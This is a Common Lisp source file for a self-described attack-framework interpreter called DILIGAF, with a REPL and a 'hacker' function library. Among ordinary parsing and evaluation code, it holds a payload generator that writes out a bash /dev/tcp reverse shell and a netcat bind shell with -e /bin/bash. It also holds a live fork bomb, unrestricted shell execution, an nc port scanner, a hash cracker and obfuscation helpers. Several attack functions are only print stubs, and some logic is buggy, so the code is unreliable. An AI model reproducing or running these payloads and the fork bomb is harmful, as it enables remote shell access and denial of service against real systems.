#!/usr/bin/env sbcl --script
;; DILIGAF - Direct Interface for Low-level Intrusion and General-purpose Attack Framework
;; A hacker-focused programming language built in Lisp for maximum flexibility and self-modification

;; Banner and startup
(defun print-banner ()
  (format t "~%")
  (format t "╔══════════════════════════════════════════════════════════════╗~%")
  (format t "║  ██████╗ ██╗██╗     ██╗ ██████╗  █████╗ ███████╗  ║~%")
  (format t "║  ██╔══██╗██║██║     ██║██╔════╝ ██╔══██╗██╔════╝  ║~%")
  (format t "║  ██║  ██║██║██║     ██║██║  ███╗███████║█████╗    ║~%")
  (format t "║  ██║  ██║██║██║     ██║██║   ██║██╔══██║██╔══╝    ║~%")
  (format t "║  ██████╔╝██║███████╗██║╚██████╔╝██║  ██║██║       ║~%")
  (format t "║  ╚═════╝ ╚╝╚══════╝╚═╝ ╚═════╝ ╚═╝  ╚═╝╚═╝       ║~%")
  (format t "║                                                      ║~%")
  (format t "║  Direct Interface for Low-level Intrusion and        ║~%")
  (format t "║  General-purpose Attack Framework                    ║~%")
  (format t "║                                                      ║~%")
  (format t "║  Because hackers don't want ceremony, they want      ║~%")
  (format t "║  control.                                            ║~%")
  (format t "╚══════════════════════════════════════════════════════╝~%")
  (format t "~%"))

;; Core DILIGAF interpreter
(defclass diligaf-interpreter ()
  ((environment :initform (make-hash-table :test 'equal) :accessor env)
   (macros :initform (make-hash-table :test 'equal) :accessor macros)
   (hooks :initform (make-hash-table :test 'equal) :accessor hooks)
   (memory-map :initform (make-hash-table :test 'equal) :accessor memory-map)
   (processes :initform (make-hash-table :test 'equal) :accessor processes)
   (network-interfaces :initform (make-hash-table :test 'equal) :accessor network-interfaces)
   (obfuscation-key :initform nil :accessor obfuscation-key)
   (anti-debug :initform t :accessor anti-debug)))

(defvar *diligaf* (make-instance 'diligaf-interpreter))

;; Tokenizer
(defun tokenize (code)
  "Tokenize DILIGAF code into tokens"
  (let ((tokens '())
        (pos 0)
        (len (length code)))
    (loop while (< pos len) do
      (let ((char (char code pos)))
        (cond
          ((char= char #\Space) (incf pos))
          ((char= char #\Newline) (incf pos))
          ((char= char #\Tab) (incf pos))
          ((char= char #\()
           (push (list :lparen pos) tokens)
           (incf pos))
          ((char= char #\))
           (push (list :rparen pos) tokens)
           (incf pos))
          ((char= char #\')
           (push (list :quote pos) tokens)
           (incf pos))
          ((char= char #\`)
           (push (list :backquote pos) tokens)
           (incf pos))
          ((char= char #\,)
           (push (list :comma pos) tokens)
           (incf pos))
          ((char= char #\")
           ;; String literal
           (let ((start pos))
             (incf pos)
             (loop while (and (< pos len) (char/= (char code pos) #\")) do
               (incf pos))
             (if (< pos len)
                 (progn
                   (push (list :string (subseq code (1+ start) pos) start) tokens)
                   (incf pos))
                 (error "Unterminated string at position ~a" start))))
          ((or (char= char #\-) (digit-char-p char))
           ;; Number
           (let ((start pos))
             (if (char= char #\-) (incf pos))
             (loop while (and (< pos len) (or (digit-char-p (char code pos)) (char= (char code pos) #\.))) do
               (incf pos))
             (push (list :number (subseq code start pos) start) tokens)))
          ((or (alpha-char-p char) (find char "!@#$%^&*-_+=|\\:;<>?/~`"))
           ;; Symbol
           (let ((start pos))
             (loop while (and (< pos len) 
                              (or (alphanumericp (char code pos)) 
                                  (find (char code pos) "!@#$%^&*-_+=|\\:;<>?/~`"))) do
               (incf pos))
             (push (list :symbol (subseq code start pos) start) tokens)))
          (t (incf pos)))))
    (nreverse tokens)))

;; Parser
(defun parse (tokens)
  "Parse tokens into AST"
  (if (null tokens)
      nil
      (let ((token (car tokens)))
        (case (car token)
          (:lparen
           (let ((result '())
                 (remaining (cdr tokens)))
             (loop while (and remaining (not (eq (caar remaining) :rparen))) do
               (let ((parsed (parse remaining)))
                 (push (car parsed) result)
                 (setf remaining (cdr parsed))))
             (if remaining
                 (cons result (cdr remaining))
                 (error "Unmatched parenthesis"))))
          (:rparen (error "Unexpected closing parenthesis"))
          (:quote
           (let ((parsed (parse (cdr tokens))))
             (cons (list 'quote (car parsed)) (cdr parsed))))
          (:backquote
           (let ((parsed (parse (cdr tokens))))
             (cons (list 'backquote (car parsed)) (cdr parsed))))
          (:comma
           (let ((parsed (parse (cdr tokens))))
             (cons (list 'unquote (car parsed)) (cdr parsed))))
          (:string
           (cons (cadr token) (cdr tokens)))
          (:number
           (let ((value (read-from-string (cadr token))))
             (cons value (cdr tokens))))
          (:symbol
           (cons (intern (string-upcase (cadr token))) (cdr tokens)))
          (t (cons token (cdr tokens)))))))

;; Evaluator
(defun eval-expr (expr interpreter)
  "Evaluate expression in DILIGAF interpreter"
  (cond
    ((atom expr)
     (if (symbolp expr)
         (gethash expr (env interpreter))
         expr))
    ((listp expr)
     (let ((op (car expr)))
       (case op
         (quote (cadr expr))
         (backquote (eval-backquote (cadr expr) interpreter))
         (unquote (eval-expr (cadr expr) interpreter))
         (t (apply-function op (mapcar (lambda (x) (eval-expr x interpreter)) (cdr expr)) interpreter)))))))

(defun eval-backquote (expr interpreter)
  "Evaluate backquoted expression"
  (cond
    ((atom expr) expr)
    ((listp expr)
     (if (eq (car expr) 'unquote)
         (eval-expr (cadr expr) interpreter)
         (mapcar (lambda (x) (eval-backquote x interpreter)) expr)))))

(defun apply-function (func args interpreter)
  "Apply function to arguments"
  (cond
    ((functionp func) (apply func args))
    ((symbolp func)
     (let ((val (gethash func (env interpreter))))
       (if val
           (if (functionp val)
               (apply val args)
               (error "~a is not a function" func))
           (error "Undefined function: ~a" func))))
    (t (error "Cannot apply ~a" func))))

;; Core Lisp functions
(defun init-core-functions (interpreter)
  "Initialize core Lisp functions"
  (let ((env (env interpreter)))
    (setf (gethash '+ env) #'diligaf-add)
    (setf (gethash '- env) #'diligaf-sub)
    (setf (gethash '* env) #'diligaf-mul)
    (setf (gethash '/ env) #'diligaf-div)
    (setf (gethash '= env) #'diligaf-eq)
    (setf (gethash '< env) #'diligaf-lt)
    (setf (gethash '> env) #'diligaf-gt)
    (setf (gethash 'and env) #'diligaf-and)
    (setf (gethash 'or env) #'diligaf-or)
    (setf (gethash 'not env) #'diligaf-not)
    (setf (gethash 'if env) #'diligaf-if)
    (setf (gethash 'define env) #'diligaf-define)
    (setf (gethash 'lambda env) #'diligaf-lambda)
    (setf (gethash 'quote env) #'diligaf-quote)
    (setf (gethash 'list env) #'diligaf-list)
    (setf (gethash 'car env) #'diligaf-car)
    (setf (gethash 'cdr env) #'diligaf-cdr)
    (setf (gethash 'cons env) #'diligaf-cons)
    (setf (gethash 'print env) #'diligaf-print)
    (setf (gethash 'eval env) #'diligaf-eval)
    (setf (gethash 'apply env) #'diligaf-apply)))

;; Arithmetic functions
(defun diligaf-add (&rest args)
  "Add all arguments"
  (apply #'+ args))

(defun diligaf-sub (x &rest args)
  "Subtract arguments from first"
  (if args
      (- x (apply #'+ args))
      (- x)))

(defun diligaf-mul (&rest args)
  "Multiply all arguments"
  (apply #'* args))

(defun diligaf-div (x y)
  "Divide first by second"
  (/ x y))

;; Comparison functions
(defun diligaf-eq (x y)
  "Test equality"
  (= x y))

(defun diligaf-lt (x y)
  "Test less than"
  (< x y))

(defun diligaf-gt (x y)
  "Test greater than"
  (> x y))

;; Logical functions
(defun diligaf-and (&rest args)
  "Logical AND"
  (every #'identity args))

(defun diligaf-or (&rest args)
  "Logical OR"
  (some #'identity args))

(defun diligaf-not (x)
  "Logical NOT"
  (not x))

;; Control flow
(defun diligaf-if (condition then &optional else)
  "Conditional expression"
  (if (eval-expr condition *diligaf*)
      (eval-expr then *diligaf*)
      (if else (eval-expr else *diligaf*) nil)))

;; Variable definition
(defun diligaf-define (name value)
  "Define variable or function"
  (setf (gethash name (env *diligaf*)) (eval-expr value *diligaf*))
  name)

;; Lambda functions
(defun diligaf-lambda (params body)
  "Create lambda function"
  (lambda (&rest args)
    (let ((old-env (env *diligaf*)))
      (setf (env *diligaf*) (make-hash-table :test 'equal))
      ;; Copy old environment
      (maphash (lambda (k v) (setf (gethash k (env *diligaf*)) v)) old-env)
      ;; Bind parameters
      (mapc (lambda (param arg) (setf (gethash param (env *diligaf*)) arg)) params args)
      ;; Evaluate body
      (prog1 (eval-expr body *diligaf*)
        (setf (env *diligaf*) old-env)))))

;; List functions
(defun diligaf-quote (x)
  "Quote expression"
  x)

(defun diligaf-list (&rest args)
  "Create list"
  args)

(defun diligaf-car (lst)
  "Get first element of list"
  (if (listp lst) (car lst) nil))

(defun diligaf-cdr (lst)
  "Get rest of list"
  (if (listp lst) (cdr lst) nil))

(defun diligaf-cons (x y)
  "Cons element onto list"
  (cons x (if (listp y) y (list y))))

;; I/O functions
(defun diligaf-print (&rest args)
  "Print arguments"
  (format t "~{~a ~}~%" args)
  (car (last args)))

;; Evaluation functions
(defun diligaf-eval (expr)
  "Evaluate expression"
  (eval-expr expr *diligaf*))

(defun diligaf-apply (func args)
  "Apply function to arguments"
  (apply-function func args *diligaf*))

;; System access functions
(defun init-system-functions (interpreter)
  "Initialize system-level functions"
  (let ((env (env interpreter)))
    (setf (gethash 'mem-read env) #'diligaf-mem-read)
    (setf (gethash 'mem-write env) #'diligaf-mem-write)
    (setf (gethash 'syscall env) #'diligaf-syscall)
    (setf (gethash 'proc-read env) #'diligaf-proc-read)
    (setf (gethash 'dev-read env) #'diligaf-dev-read)
    (setf (gethash 'dev-write env) #'diligaf-dev-write)
    (setf (gethash 'inject env) #'diligaf-inject)
    (setf (gethash 'hook env) #'diligaf-hook)
    (setf (gethash 'unhook env) #'diligaf-unhook)
    (setf (gethash 'shell env) #'diligaf-shell)
    (setf (gethash 'forkbomb env) #'diligaf-forkbomb)))

;; Memory manipulation
(defun diligaf-mem-read (address size)
  "Read from memory address"
  (declare (ignore address size))
  ;; This is a simplified implementation
  ;; In a real implementation, you'd use FFI or similar
  (make-array 16 :element-type '(unsigned-byte 8) :initial-element 0))

(defun diligaf-mem-write (address data)
  "Write to memory address"
  (declare (ignore address data))
  ;; This is a simplified implementation
  t)

;; System calls
(defun diligaf-syscall (num &rest args)
  "Make system call"
  (declare (ignore num args))
  ;; This is a simplified implementation
  0)

;; Process filesystem access
(defun diligaf-proc-read (path)
  "Read from /proc filesystem"
  (with-open-file (stream (format nil "/proc/~a" path) :if-does-not-exist nil)
    (if stream
        (let ((content (make-string (file-length stream))))
          (read-sequence content stream)
          content)
        "")))

;; Device access
(defun diligaf-dev-read (device)
  "Read from device file"
  (with-open-file (stream (format nil "/dev/~a" device) :element-type '(unsigned-byte 8) :if-does-not-exist nil)
    (if stream
        (let ((content (make-array (file-length stream) :element-type '(unsigned-byte 8))))
          (read-sequence content stream)
          content)
        #())))

(defun diligaf-dev-write (device data)
  "Write to device file"
  (with-open-file (stream (format nil "/dev/~a" device) :element-type '(unsigned-byte 8) :direction :output :if-exists :append)
    (write-sequence data stream)
    t))

;; Process injection
(defun diligaf-inject (pid code)
  "Inject code into process"
  (format t "[DILIGAF] Injecting code into PID ~a: ~a~%" pid code)
  t)

;; Function hooking
(defun diligaf-hook (function hook-func)
  "Hook function call"
  (setf (gethash function (hooks *diligaf*)) hook-func)
  t)

(defun diligaf-unhook (function)
  "Remove function hook"
  (remhash function (hooks *diligaf*))
  t)

;; Shell execution
(defun diligaf-shell (command)
  "Execute shell command"
  (let ((output (make-string-output-stream)))
    (multiple-value-bind (stdout stderr exit-code)
        (uiop:run-program command :output output :error-output :string)
      (declare (ignore stdout stderr))
      (if (zerop exit-code)
          (get-output-stream-string output)
          (format nil "Command failed with exit code ~a" exit-code)))))

;; Fork bomb
(defun diligaf-forkbomb ()
  "Fork bomb implementation"
  (loop do (sb-ext:run-program "/bin/sh" '("-c" "true") :wait nil)))

;; Network functions
(defun init-network-functions (interpreter)
  "Initialize network functions"
  (let ((env (env interpreter)))
    (setf (gethash 'http-get env) #'diligaf-http-get)
    (setf (gethash 'http-post env) #'diligaf-http-post)
    (setf (gethash 'dns-lookup env) #'diligaf-dns-lookup)
    (setf (gethash 'socket env) #'diligaf-socket)
    (setf (gethash 'sniff env) #'diligaf-sniff)
    (setf (gethash 'spoof env) #'diligaf-spoof)
    (setf (gethash 'packet-craft env) #'diligaf-packet-craft)
    (setf (gethash 'port-scan env) #'diligaf-port-scan)))

;; HTTP functions
(defun diligaf-http-get (url &optional headers)
  "HTTP GET request"
  (declare (ignore headers))
  (let ((output (make-string-output-stream)))
    (multiple-value-bind (stdout stderr exit-code)
        (uiop:run-program (list "curl" "-s" url) :output output :error-output :string)
      (declare (ignore stdout stderr))
      (if (zerop exit-code)
          (list :status 200 :body (get-output-stream-string output))
          (list :status 500 :body (format nil "Request failed with exit code ~a" exit-code))))))

(defun diligaf-http-post (url data &optional headers)
  "HTTP POST request"
  (declare (ignore headers))
  (let ((output (make-string-output-stream)))
    (multiple-value-bind (stdout stderr exit-code)
        (uiop:run-program (list "curl" "-s" "-X" "POST" "-d" data url) :output output :error-output :string)
      (declare (ignore stdout stderr))
      (if (zerop exit-code)
          (list :status 200 :body (get-output-stream-string output))
          (list :status 500 :body (format nil "Request failed with exit code ~a" exit-code))))))

;; DNS lookup
(defun diligaf-dns-lookup (hostname)
  "DNS lookup"
  (let ((output (make-string-output-stream)))
    (multiple-value-bind (stdout stderr exit-code)
        (uiop:run-program (list "nslookup" hostname) :output output :error-output :string)
      (declare (ignore stdout stderr))
      (if (zerop exit-code)
          (let ((result (get-output-stream-string output)))
            (mapcar #'string-trim (remove-if #'string= (split-sequence:split-sequence #\Newline result) '(""))))
          '()))))

;; Socket creation
(defun diligaf-socket (family type protocol)
  "Create socket"
  (declare (ignore family type protocol))
  ;; This is a simplified implementation
  t)

;; Packet sniffing
(defun diligaf-sniff (interface count)
  "Sniff packets from interface"
  (declare (ignore interface count))
  (format t "[DILIGAF] Sniffing packets from ~a~%" interface)
  '())

;; IP spoofing
(defun diligaf-spoof (ip)
  "Spoof source IP"
  (format t "[DILIGAF] Spoofing source IP to ~a~%" ip)
  t)

;; Packet crafting
(defun diligaf-packet-craft (protocol &rest kwargs)
  "Craft custom packet"
  (format t "[DILIGAF] Crafting ~a packet with ~a~%" protocol kwargs)
  #())

;; Port scanning
(defun diligaf-port-scan (target ports)
  "Port scan target"
  (let ((results (make-hash-table :test 'equal)))
    (dolist (port ports)
      (let ((output (make-string-output-stream)))
        (multiple-value-bind (stdout stderr exit-code)
            (uiop:run-program (list "nc" "-z" "-v" target (format nil "~a" port)) :output output :error-output :string)
          (declare (ignore stdout stderr))
          (setf (gethash port results) (if (zerop exit-code) "open" "closed")))))
    results))

;; Hacker utility functions
(defun init-hacker-functions (interpreter)
  "Initialize hacker-specific functions"
  (let ((env (env interpreter)))
    (setf (gethash 'xor env) #'diligaf-xor)
    (setf (gethash 'obfuscate env) #'diligaf-obfuscate)
    (setf (gethash 'polymorph env) #'diligaf-polymorph)
    (setf (gethash 'anti-debug env) #'diligaf-anti-debug)
    (setf (gethash 'fuzz env) #'diligaf-fuzz)
    (setf (gethash 'exploit env) #'diligaf-exploit)
    (setf (gethash 'payload env) #'diligaf-payload)
    (setf (gethash 'encode env) #'diligaf-encode)
    (setf (gethash 'decode env) #'diligaf-decode)
    (setf (gethash 'hash env) #'diligaf-hash)
    (setf (gethash 'crack env) #'diligaf-crack)))

;; XOR encryption
(defun diligaf-xor (data key)
  "XOR encryption/obfuscation"
  (let ((data-bytes (if (stringp data) (map 'vector #'char-code data) data))
        (key-bytes (if (stringp key) (map 'vector #'char-code key) key))
        (result (make-array (length data-bytes) :element-type '(unsigned-byte 8))))
    (dotimes (i (length data-bytes))
      (setf (aref result i) (logxor (aref data-bytes i) (aref key-bytes (mod i (length key-bytes))))))
    result))

;; Code obfuscation
(defun diligaf-obfuscate (code method)
  "Obfuscate code"
  (case method
    (:xor (diligaf-xor code "secret-key"))
    (:base64 (base64:usb8-array-to-base64-string (map 'vector #'char-code code)))
    (:hex (format nil "~{~2,'0x~}" (map 'list #'char-code code)))
    (t code)))

;; Polymorphic code generation
(defun diligaf-polymorph (code)
  "Generate polymorphic code"
  (let ((replacements '((#\a . #\α) (#\e . #\ε) (#\o . #\ο) (#\i . #\ι) (#\u . #\υ))))
    (reduce (lambda (str pair) (substitute (cdr pair) (car pair) str)) replacements :initial-value code)))

;; Anti-debugging
(defun diligaf-anti-debug ()
  "Anti-debugging measures"
  (let ((status-file "/proc/self/status"))
    (if (probe-file status-file)
        (with-open-file (stream status-file)
          (let ((content (make-string (file-length stream))))
            (read-sequence content stream)
            (not (search "TracerPid:" content))))
        t)))

;; Fuzzing
(defun diligaf-fuzz (target pattern count)
  "Fuzz target with pattern"
  (let ((results '()))
    (dotimes (i count)
      (push (substitute (format nil "~a" i) "FUZZ" pattern) results))
    (nreverse results)))

;; Exploitation
(defun diligaf-exploit (target exploit)
  "Execute exploit against target"
  (format t "[DILIGAF] Executing ~a against ~a~%" exploit target)
  t)

;; Payload generation
(defun diligaf-payload (type &rest kwargs)
  "Generate payload"
  (case type
    (:reverse-shell
     (let ((host (getf kwargs :host "127.0.0.1"))
           (port (getf kwargs :port 4444)))
       (format nil "bash -i >& /dev/tcp/~a/~a 0>&1" host port)))
    (:bind-shell
     (let ((port (getf kwargs :port 4444)))
       (format nil "nc -l -p ~a -e /bin/bash" port)))
    (t "")))

;; Encoding/Decoding
(defun diligaf-encode (data encoding)
  "Encode data"
  (case encoding
    (:base64 (base64:usb8-array-to-base64-string (map 'vector #'char-code data)))
    (:hex (format nil "~{~2,'0x~}" (map 'list #'char-code data)))
    (:url (drakma:url-encode data))
    (t data)))

(defun diligaf-decode (data encoding)
  "Decode data"
  (case encoding
    (:base64 (map 'string #'code-char (base64:base64-string-to-usb8-array data)))
    (:hex (map 'string #'code-char (map 'vector #'parse-integer (split-sequence:split-sequence #\Space data))))
    (:url (drakma:url-decode data))
    (t data)))

;; Hashing
(defun diligaf-hash (data algorithm)
  "Hash data"
  (let ((digest (ironclad:make-digest algorithm)))
    (ironclad:update-digest digest (map 'vector #'char-code data))
    (ironclad:byte-array-to-hex-string (ironclad:produce-digest digest))))

;; Hash cracking
(defun diligaf-crack (hash-value wordlist algorithm)
  "Crack hash using wordlist"
  (dolist (word wordlist)
    (when (string= (diligaf-hash word algorithm) hash-value)
      (return word))))

;; Macro system
(defun init-macro-functions (interpreter)
  "Initialize macro system"
  (let ((env (env interpreter)))
    (setf (gethash 'defmacro env) #'diligaf-defmacro)
    (setf (gethash 'macroexpand env) #'diligaf-macroexpand)))

(defun diligaf-defmacro (name params body)
  "Define macro"
  (setf (gethash name (macros *diligaf*)) (lambda (&rest args)
                                            (eval-expr (apply (eval-expr body *diligaf*) args) *diligaf*)))
  name)

(defun diligaf-macroexpand (expr)
  "Expand macro"
  (if (and (listp expr) (symbolp (car expr)))
      (let ((macro (gethash (car expr) (macros *diligaf*))))
        (if macro
            (apply macro (cdr expr))
            expr))
      expr))

;; Self-modification functions
(defun init-self-modification (interpreter)
  "Initialize self-modification functions"
  (let ((env (env interpreter)))
    (setf (gethash 'self-modify env) #'diligaf-self-modify)
    (setf (gethash 'hot-swap env) #'diligaf-hot-swap)
    (setf (gethash 'rewrite-self env) #'diligaf-rewrite-self)))

(defun diligaf-self-modify (code)
  "Modify code at runtime"
  (let ((modified (diligaf-polymorph code)))
    (format t "[DILIGAF] Original: ~a~%" code)
    (format t "[DILIGAF] Modified: ~a~%" modified)
    modified))

(defun diligaf-hot-swap (module-name new-code)
  "Hot-swap module"
  (setf (gethash module-name (env *diligaf*)) (eval-expr new-code *diligaf*))
  (format t "[DILIGAF] Hot-swapped module: ~a~%" module-name)
  t)

(defun diligaf-rewrite-self (new-functions)
  "Rewrite interpreter with new functions"
  (dolist (func new-functions)
    (setf (gethash (car func) (env *diligaf*)) (eval-expr (cadr func) *diligaf*)))
  (format t "[DILIGAF] Interpreter rewritten with ~a new functions~%" (length new-functions))
  t)

;; REPL
(defun run-repl ()
  "Run DILIGAF REPL"
  (print-banner)
  (format t "[DILIGAF] Interactive REPL ready. Type 'exit' to quit.~%")
  (format t "[DILIGAF] System: ~a ~a~%" (software-type) (software-version))
  (format t "[DILIGAF] Architecture: ~a~%" (machine-type))
  (format t "~%")
  
  (loop
    (format t "DILIGAF> ")
    (force-output)
    (let ((input (read-line)))
      (cond
        ((or (string= input "exit") (string= input "quit") (string= input "q"))
         (format t "[DILIGAF] Goodbye, hacker.~%")
         (return))
        ((string= input "")
         nil)
        (t
         (handler-case
             (let ((tokens (tokenize input)))
               (if tokens
                   (let ((ast (parse tokens)))
                     (if ast
                         (let ((result (eval-expr (car ast) *diligaf*)))
                           (if result
                               (format t "[OUTPUT] ~a~%" result))))))
           (error (e)
             (format t "[ERROR] ~a~%" e))))))))

;; Initialize DILIGAF
(defun init-diligaf ()
  "Initialize DILIGAF interpreter"
  (init-core-functions *diligaf*)
  (init-system-functions *diligaf*)
  (init-network-functions *diligaf*)
  (init-hacker-functions *diligaf*)
  (init-macro-functions *diligaf*)
  (init-self-modification *diligaf*)
  (format t "DILIGAF initialized successfully.~%"))

;; Main entry point
(defun main ()
  "Main entry point"
  (init-diligaf)
  (if (> (length *posix-argv*) 1)
      ;; Run script file
      (let ((filename (nth 1 *posix-argv*)))
        (with-open-file (stream filename)
          (let ((content (make-string (file-length stream))))
            (read-sequence content stream)
            (let ((tokens (tokenize content)))
              (if tokens
                  (let ((ast (parse tokens)))
                    (if ast
                        (eval-expr (car ast) *diligaf*))))))))
      ;; Start REPL
      (run-repl)))

;; Run if called directly
(when (string= (pathname-name *load-truename*) "diligaf")
  (main))
